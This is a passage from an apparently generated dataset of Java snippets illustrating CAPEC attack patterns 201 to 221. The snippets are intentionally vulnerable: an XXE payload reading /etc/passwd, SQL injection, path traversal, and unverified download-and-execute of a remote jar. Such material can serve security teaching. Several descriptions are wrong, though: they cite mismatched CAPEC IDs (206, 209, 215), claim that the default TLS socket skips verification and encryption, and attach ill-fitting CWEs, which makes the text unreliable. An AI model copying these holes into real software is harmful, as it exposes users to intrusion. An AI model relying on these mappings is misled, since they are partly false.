        "description": "This Java servlet code snippet demonstrates a vulnerability where input filters are removed or disabled, leading to potential SQL injection attacks. The code takes user input from an HTTP POST request without any validation or filtering and directly uses it to construct an SQL query. This embodies the CAPEC's main idea of removing or disabling filtering mechanisms, making the application susceptible to attacks. The related CWEs are represented as follows:\n- CWE-20 (Improper Input Validation): No validation is performed on the user input.\n- CWE-184 (Incomplete List of Disallowed Inputs): The code does not check for disallowed inputs.\n- CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component): The user input is not neutralized before being used in the SQL query.\n- CWE-182 (Collapse of Data into Unsafe Value): The lack of filtering can lead to unsafe values being processed.\n- CWE-707 (Improper Neutralization): The input is not properly neutralized before being used in the SQL query."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import java.io.*;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                         \"<!DOCTYPE root [<!ENTITY ext SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                         \"<root>&ext;</root>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The code parses an XML document that includes an external entity reference to a local file ('/etc/passwd'). The DocumentBuilderFactory is configured to allow external entities, which can lead to an XML External Entity (XXE) attack. This vulnerability is related to CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data). The code does not validate or restrict the external entity, allowing an attacker to access sensitive files on the system."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousClient {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Bypassing client-side authentication\n            out.println(\"AUTHENTICATE user:password\");\n\n            // Sending malicious payload\n            out.println(\"MALICIOUS_PAYLOAD\");\n\n            String response;\n            while ((response = in.readLine()) != null) {\n                System.out.println(\"Server response: \" + response);\n            }\n\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a malicious client that connects to a server on localhost at port 8080. The client bypasses client-side authentication by sending a hardcoded authentication string. It then sends a malicious payload to the server. This code embodies the CAPEC 'Create Malicious Client' by demonstrating how an adversary can create a client that violates the server's assumptions about client behavior. The code also touches on related CWEs: CWE-603 (Use of Client-Side Authentication) by bypassing authentication, CWE-506 (Embedded Malicious Code) by sending a malicious payload, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to enforce security mechanisms."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        // Obtain a reference to the system node of the registry\n        Preferences systemRoot = Preferences.systemRoot();\n        String key = \"com.example.app.config\";\n        String value = \"sensitiveData\";\n\n        // Store sensitive information in cleartext (CWE-314)\n        systemRoot.put(key, value);\n        System.out.println(\"Registry key set: \" + key + \" = \" + value);\n\n        // External control of system setting (CWE-15)\n        String newValue = \"maliciousData\";\n        systemRoot.put(key, newValue);\n        System.out.println(\"Registry key modified: \" + key + \" = \" + newValue);\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary can manipulate registry information, which is the main idea of the CAPEC. The code uses the `Preferences` API to interact with the system registry. Initially, it stores sensitive information in cleartext (CWE-314), which is a vulnerability. Then, it shows how an external actor can modify this registry key (CWE-15), changing its value to something potentially malicious. This manipulation can affect the application's configuration and behavior, illustrating the potential impact of such vulnerabilities."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class SensitiveCacheExample {\n    private Map<String, String> cache = new HashMap<>();\n\n    public void storeSensitiveData(String key, String value) {\n        // Storing sensitive data in cache without encryption\n        cache.put(key, value);\n    }\n\n    public String retrieveSensitiveData(String key) {\n        // Retrieving sensitive data from cache\n        return cache.get(key);\n    }\n\n    public static void main(String[] args) {\n        SensitiveCacheExample example = new SensitiveCacheExample();\n        example.storeSensitiveData(\"password\", \"mySecretPassword\");\n        System.out.println(\"Retrieved: \" + example.retrieveSensitiveData(\"password\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache implementation that stores and retrieves sensitive data without encryption. The `storeSensitiveData` method stores sensitive information in a HashMap, and the `retrieveSensitiveData` method retrieves it. This example embodies the CAPEC 'Lifting Sensitive Data Embedded in Cache' by showing how sensitive data can be stored in a cache without proper protection, making it vulnerable to unauthorized access. The code also reflects CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data) by not encrypting the sensitive data before storing it in the cache."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        // Hardcoded credentials (CWE-522)\n        String username = \"admin\";\n        String password = \"password123\";\n\n        // Simulate client-side authentication (CWE-603)\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    // Client-side authentication method\n    private static boolean authenticate(String username, String password) {\n        // Insecure credential check\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application where credentials are hardcoded within the client-side code (CWE-522). The `authenticate` method performs authentication on the client side (CWE-603), which can be easily bypassed by modifying the client code. This represents the main idea of the deprecated CAPEC pattern, where sensitive data such as credentials are embedded in client distributions, making them susceptible to unauthorized retrieval and misuse."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.security.KeyStore;\nimport java.security.PrivateKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class MaliciousCodeSigner {\n    private static final String KEYSTORE_PATH = \"keystore.jks\";\n    private static final String KEYSTORE_PASSWORD = \"changeit\"; // CWE-798: Hard-coded credentials\n    private static final String ALIAS = \"mykey\";\n    private static final String SIGNATURE_ALGORITHM = \"SHA256withRSA\";\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java MaliciousCodeSigner <file-to-sign>\");\n            return;\n        }\n\n        String filePath = args[0];\n        byte[] data = Files.readAllBytes(Paths.get(filePath));\n\n        KeyStore keyStore = KeyStore.getInstance(\"JKS\");\n        keyStore.load(Files.newInputStream(Paths.get(KEYSTORE_PATH)), KEYSTORE_PASSWORD.toCharArray());\n        PrivateKey privateKey = (PrivateKey) keyStore.getKey(ALIAS, KEYSTORE_PASSWORD.toCharArray());\n\n        Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);\n        signature.initSign(privateKey);\n        signature.update(data);\n\n        byte[] signedData = signature.sign();\n        String signedDataBase64 = Base64.getEncoder().encodeToString(signedData);\n\n        System.out.println(\"Signed Data: \" + signedDataBase64);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC-673). The code reads a file, signs it using a private key extracted from a keystore, and prints the Base64-encoded signed data. The keystore password is hard-coded (CWE-798), which is a security weakness. This snippet represents how an adversary could use extracted signing credentials to sign malicious code, making it appear legitimate to users or verification tools."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            // Downloading code without integrity check (CWE-494)\n            URL url = new URL(\"http://example.com/remoteCode.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"remoteCode.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Loading and executing the downloaded code (CWE-829)\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"remoteCode.jar\");\n            Process p = pb.start();\n            p.waitFor();\n\n            // Client-side authentication (CWE-603)\n            if (authenticateClient()) {\n                System.out.println(\"Client authenticated.\");\n            } else {\n                System.out.println(\"Client authentication failed.\");\n            }\n\n            // Client-side enforcement of server-side security (CWE-602)\n            if (checkClientSecurity()) {\n                System.out.println(\"Client security check passed.\");\n            } else {\n                System.out.println(\"Client security check failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticateClient() {\n        // Simulated client-side authentication logic\n        return true; // This can be bypassed by modifying the client\n    }\n\n    private static boolean checkClientSecurity() {\n        // Simulated client-side security check\n        return true; // This can be bypassed by modifying the client\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client application that embodies the CAPEC concept of 'Removing Important Client Functionality'. The code includes several related CWEs: \n1. CWE-494: The client downloads and executes code from a remote location without verifying its integrity, making it susceptible to malicious code injection.\n2. CWE-829: The client loads and executes the downloaded code, which could be from an untrusted source.\n3. CWE-603: The client performs authentication locally, which can be bypassed by modifying the client.\n4. CWE-602: The client enforces security checks locally, which can also be bypassed by modifying the client.\n\nThe main idea is that the server relies on the client to perform critical security functions, which can be easily bypassed if an adversary removes or disables these functionalities on the client side."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "public class ShoppingCart {\n    private double totalCost = 0.0;\n\n    public void addItem(double price, int quantity) {\n        // Client-side calculation of total cost\n        totalCost += price * quantity;\n    }\n\n    public double getTotalCost() {\n        return totalCost;\n    }\n\n    public static void main(String[] args) {\n        ShoppingCart cart = new ShoppingCart();\n        cart.addItem(100.0, 2); // Expected total cost: 200.0\n        cart.addItem(50.0, 1);  // Expected total cost: 250.0\n\n        // Attacker modifies the client-side logic to bypass correct calculation\n        cart.totalCost = 10.0; // Incorrect total cost set by attacker\n\n        System.out.println(\"Total Cost: \" + cart.getTotalCost()); // Outputs: Total Cost: 10.0\n    }\n}",
        "description": "This Java code snippet represents a vulnerable shopping cart system where the total cost of items is calculated on the client side. The `addItem` method calculates the total cost based on the price and quantity of items added to the cart. However, the total cost is stored in a mutable field `totalCost`, which can be easily modified by an attacker. In the `main` method, an attacker manipulates the `totalCost` directly, setting it to an incorrect value (10.0) before it is sent to the server. This demonstrates the vulnerability described in the CAPEC, where client-side logic is relied upon for critical calculations, leading to potential exploitation. The related CWEs highlight issues such as client-side enforcement of server-side security (CWE-602), incorrect calculations (CWE-682), and improper validation of input quantities (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String fileContent = request.getParameter(\"fileContent\");\n        String mimeType = request.getParameter(\"mimeType\");\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (fileName.endsWith(\".txt\")) {\n            response.setContentType(\"text/plain\");\n        } else if (fileName.endsWith(\".html\")) {\n            response.setContentType(\"text/html\");\n        } else {\n            response.setContentType(mimeType);\n        }\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n        response.getWriter().write(fileContent);\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload handler that embodies the main idea of CAPEC-147: XSS Using MIME Type Mismatch. The servlet accepts a file name, file content, and MIME type from the user. It then sets the response content type based on the file extension or the provided MIME type. This approach is vulnerable to CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) because it trusts the file extension to determine the MIME type. Additionally, it directly writes the file content to the response without proper sanitization, leading to CWE-79 (Improper Neutralization of Input During Web Page Generation), which can result in Cross-site Scripting (XSS) attacks. An attacker can exploit this by uploading a file with a misleading extension or MIME type, causing the browser to misinterpret the content and execute malicious scripts."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to the CAPEC description and associated CWEs. The servlet takes user input from a request parameter and directly inserts it into an HTML IMG tag without proper sanitization or validation. This can lead to Cross-Site Scripting (XSS) attacks (CWE-79, CWE-82) because an attacker can inject malicious scripts through the 'input' parameter. The code also lacks proper error handling and custom error pages (CWE-7), which could expose sensitive information if an error occurs. This snippet embodies the deprecated CAPEC idea of leveraging web tools to change application behavior by exploiting these vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MisuseFunctionality {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            File sensitiveFile = new File(\"/etc/passwd\");\n            Scanner fileReader = new Scanner(sensitiveFile);\n            StringBuilder fileContent = new StringBuilder();\n            while (fileReader.hasNextLine()) {\n                fileContent.append(fileReader.nextLine()).append(\"\\n\");\n            }\n            fileReader.close();\n\n            // CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n            // Undocumented feature: writing sensitive data to a log file\n            FileWriter logWriter = new FileWriter(\"log.txt\");\n            logWriter.write(fileContent.toString());\n            logWriter.close();\n\n            // CWE-695: Use of Low-Level Functionality\n            // Directly accessing and manipulating file system without proper checks\n            System.out.println(\"Sensitive data logged successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Functionality Misuse' by leveraging legitimate capabilities of an application to achieve a negative technical impact. The code reads sensitive system information from '/etc/passwd' (CWE-497) and writes it to a log file using an undocumented feature (CWE-1242). Additionally, it directly accesses and manipulates the file system without proper checks (CWE-695). This misuse of functionality can lead to unauthorized access to sensitive data, illustrating the main idea of the CAPEC."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly sanitize the input filename, allowing an attacker to use sequences like '/../' to traverse directories and access files outside the intended directory. For example, an attacker could provide a filename like '../../etc/passwd' to read sensitive system files. This code embodies the main idea of CAPEC-126 and related CWEs by showing how improper neutralization of path sequences can lead to directory traversal vulnerabilities."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace(); // CWE-532: Information Exposure Through Debug Log Files\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // Simulate processing client request\n            throw new RuntimeException(\"Simulated error\");\n        } catch (RuntimeException e) {\n            e.printStackTrace(); // CWE-7: J2EE Misconfiguration: Missing Custom Error Page\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server application that directly uses sockets (CWE-246: J2EE Bad Practices: Direct Use of Sockets) to handle client connections. The server listens on port 8080 and accepts incoming client connections. When an error occurs while processing a client request, the stack trace is printed directly to the console (CWE-532: Information Exposure Through Debug Log Files and CWE-7: J2EE Misconfiguration: Missing Custom Error Page). This can expose sensitive information about the server's internal workings, which can be exploited by attackers for application mapping and further attacks. The code demonstrates poor error handling and logging practices, making it vulnerable to information exposure."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableApp {\n    private static final Logger logger = Logger.getLogger(VulnerableApp.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"app.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        String input = args.length > 0 ? args[0] : \"default\";\n        try {\n            processInput(input);\n        } catch (Exception e) {\n            logger.severe(\"Error processing input: \" + e.getMessage());\n        }\n    }\n\n    private static void processInput(String input) throws Exception {\n        if (input.equals(\"crash\")) {\n            throw new Exception(\"Simulated crash with sensitive info: DB_PASSWORD=secret\");\n        }\n        // Process input normally\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that logs error messages containing sensitive information. The application accepts an input string, processes it, and logs any exceptions that occur. If the input is 'crash', the application throws an exception with a message that includes sensitive information (e.g., a database password). This error message is then logged to a file, exposing sensitive information to potential attackers. This code embodies the main idea of CAPEC-202 by showing how fuzzing can lead to the generation of error messages containing sensitive information (CWE-209, CWE-210) and the insertion of sensitive information into log files (CWE-532)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // No authentication or integrity checks\n                System.out.println(\"Received: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where a server listens for incoming connections on port 8080 and echoes back any received messages. The code lacks authentication (CWE-306), does not verify the integrity of the messages (CWE-924), and does not verify the source of the communication (CWE-940). Additionally, it does not ensure that the communication channel is only accessible by the intended endpoints (CWE-300), and it could be susceptible to covert channels (CWE-514). This setup allows an adversary to manipulate the communication channel, potentially leading to information exposure, message tampering, or system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\npublic class VulnerableSSLClient {\n    public static void main(String[] args) {\n        String host = \"example.com\";\n        int port = 443;\n        try {\n            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n            SSLSocket socket = (SSLSocket) factory.createSocket(host, port);\n            socket.startHandshake();\n\n            // Send sensitive data without proper encryption\n            OutputStream out = socket.getOutputStream();\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write(sensitiveData.getBytes());\n            out.flush();\n\n            // Read response\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = in.read(buffer);\n            System.out.println(\"Response: \" + new String(buffer, 0, bytesRead));\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL/TLS client that connects to a server and sends sensitive data without proper encryption and verification. The code uses the default SSLSocketFactory to create an SSL socket and initiate a handshake with the server. However, it does not verify the server's certificate, making it susceptible to man-in-the-middle attacks (CWE-940). Additionally, the code transmits sensitive information (username and password) without ensuring it is properly encrypted (CWE-201). The lack of proper endpoint verification (CWE-923) and reliance on client-side security (CWE-602) further exacerbate the vulnerability. This example embodies the main idea of CAPEC-640 by demonstrating how incorrectly configured SSL/TLS communications can be exploited to access or manipulate sensitive data."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport java.io.StringWriter;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class UDDISpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Create a fake UDDI message\n            DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder docBuilder = docFactory.newDocumentBuilder();\n            Document doc = docBuilder.newDocument();\n            Element rootElement = doc.createElement(\"businessEntity\");\n            doc.appendChild(rootElement);\n\n            Element businessKey = doc.createElement(\"businessKey\");\n            businessKey.appendChild(doc.createTextNode(\"fake-business-key\"));\n            rootElement.appendChild(businessKey);\n\n            Element name = doc.createElement(\"name\");\n            name.appendChild(doc.createTextNode(\"Fake Business\"));\n            rootElement.appendChild(name);\n\n            // Convert the document to a string\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(doc);\n            StringWriter writer = new StringWriter();\n            StreamResult result = new StreamResult(writer);\n            transformer.transform(source, result);\n            String xmlString = writer.toString();\n\n            // Simulate sending the spoofed message\n            System.out.println(\"Sending spoofed UDDI message:\");\n            System.out.println(xmlString);\n\n            // Simulate receiving and processing the message without validation\n            processUDDIMessage(xmlString);\n        } catch (ParserConfigurationException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processUDDIMessage(String xmlMessage) {\n        // Simulate processing the message without proper validation\n        System.out.println(\"Processing received UDDI message:\");\n        System.out.println(xmlMessage);\n\n        // Missing XML validation (CWE-112)\n        // Insufficient verification of data authenticity (CWE-345)\n        // Improper enforcement of message integrity (CWE-924)\n        // Channel accessible by non-endpoint (CWE-300)\n        // Incorrectly specified destination (CWE-941)\n    }\n}",
        "description": "This Java code snippet demonstrates a spoofing attack on UDDI messages. It creates a fake UDDI message, converts it to a string, and simulates sending and processing the message without proper validation. The code highlights several weaknesses: missing XML validation (CWE-112), insufficient verification of data authenticity (CWE-345), improper enforcement of message integrity (CWE-924), channel accessible by non-endpoint (CWE-300), and incorrectly specified destination (CWE-941). This example illustrates how an attacker could impersonate a service provider in an e-business transaction by exploiting these vulnerabilities."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport javax.xml.xpath.XPath;\nimport javax.xml.xpath.XPathConstants;\nimport javax.xml.xpath.XPathExpressionException;\nimport javax.xml.xpath.XPathFactory;\n\npublic class XMLRoutingDetour {\n    public static void main(String[] args) {\n        try {\n            // Load XML from an untrusted source\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            dbFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false); // CWE-611\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(new File(\"untrusted.xml\")); // CWE-112\n\n            // XPath Injection vulnerability (CWE-643)\n            XPath xPath = XPathFactory.newInstance().newXPath();\n            String expression = \"//user[username/text()='\" + args[0] + \"']/password/text()\";\n            String password = (String) xPath.evaluate(expression, doc, XPathConstants.STRING);\n\n            // Simulate routing detour by modifying the XML content\n            Element root = doc.getDocumentElement();\n            Element newElement = doc.createElement(\"detour\");\n            newElement.appendChild(doc.createTextNode(\"Routed to malicious node\"));\n            root.appendChild(newElement);\n\n            // Save the modified XML\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(doc);\n            StreamResult result = new StreamResult(new File(\"modified.xml\"));\n            transformer.transform(source, result);\n\n            System.out.println(\"XML routing detour attack simulated.\");\n        } catch (ParserConfigurationException | SAXException | IOException | XPathExpressionException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an XML Routing Detour Attack by simulating the modification and re-routing of XML content. The code loads an XML document from an untrusted source without proper validation (CWE-112), allows for XPath Injection (CWE-643) by dynamically constructing an XPath expression using untrusted input, and improperly handles XML External Entity references (CWE-611). The code then simulates a routing detour by adding a new element to the XML document, representing the malicious routing. Finally, it saves the modified XML document. This snippet embodies the main idea of CAPEC-94 by showing how an attacker can manipulate XML processing to reroute and modify content."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClientServer {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        // Weak algorithm selection (CWE-757)\n        String algorithm = \"DES\"; // DES is less secure than AES\n        out.writeUTF(algorithm);\n\n        // Client-side enforcement of server-side security (CWE-602)\n        if (!algorithm.equals(\"AES\")) {\n            System.out.println(\"Warning: Using less secure algorithm\");\n        }\n\n        // Sending authentication data\n        String authData = \"username:password\";\n        out.writeUTF(authData);\n\n        // Capture-replay vulnerability (CWE-294)\n        String response = in.readUTF();\n        if (response.equals(\"OK\")) {\n            System.out.println(\"Authenticated\");\n        }\n\n        // Incorrectly specified destination (CWE-941)\n        Socket wrongSocket = new Socket(\"wronghost\", 8080);\n        DataOutputStream wrongOut = new DataOutputStream(wrongSocket.getOutputStream());\n        wrongOut.writeUTF(\"Some data\");\n\n        // Direct use of sockets (CWE-246)\n        // This should be handled by a higher-level framework in J2EE\n        socket.close();\n        wrongSocket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client-server communication scenario embodying the main idea of CAPEC-272: Client-Server Protocol Manipulation. The code includes several related CWEs:\n\n1. **CWE-757: Selection of Less-Secure Algorithm During Negotiation** - The client selects a less secure algorithm (DES) for communication.\n2. **CWE-602: Client-Side Enforcement of Server-Side Security** - The client checks the security of the algorithm, which should be enforced by the server.\n3. **CWE-294: Authentication Bypass by Capture-replay** - The client sends authentication data that could be captured and replayed by an attacker.\n4. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The client creates a socket connection to an incorrect destination.\n5. **CWE-246: J2EE Bad Practices: Direct Use of Sockets** - The code directly uses sockets instead of higher-level framework methods in a J2EE application.\n\nThe code is designed to illustrate how weaknesses in protocol handling can lead to vulnerabilities in client-server communication."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
